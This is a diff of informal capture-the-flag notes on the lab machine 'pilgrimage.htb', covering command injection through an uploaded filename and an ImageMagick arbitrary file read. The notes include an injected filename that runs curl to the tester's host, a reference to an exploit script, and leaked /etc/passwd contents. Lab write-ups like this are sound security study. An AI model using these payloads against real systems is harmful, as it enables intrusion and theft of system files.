@@ -77,7 +77,41 @@ was able to get the source code of the entire thing!
 
 now need to go thorugh the code of the github
 
+emily@pilgrimage.htb>
 
+`exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
+
+`
+this is the function calling it
+
+can we add something in the name itself to make it execute?
+
+"new|curl http://10.10.16.47:8000/iamcurling;".png
+
+![](20230723101916.png)
+
+
+IMageMagick library has an arbitrary file read vulnerability
+
+and rce .
+
+tested rce did not work
+
+let check out arbitrary file read
+
+after using the magick_exploit.py get the resultant file and usin 
+
+convert downloaded_image.png result.png
+
+identify -verbose result.png
+
+(~)>>> python3 -c 'print(bytes.fromhex("726f6f743a783a726f6f743---REDACTED--").decode("utf-8"))'
+
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
 
 
 
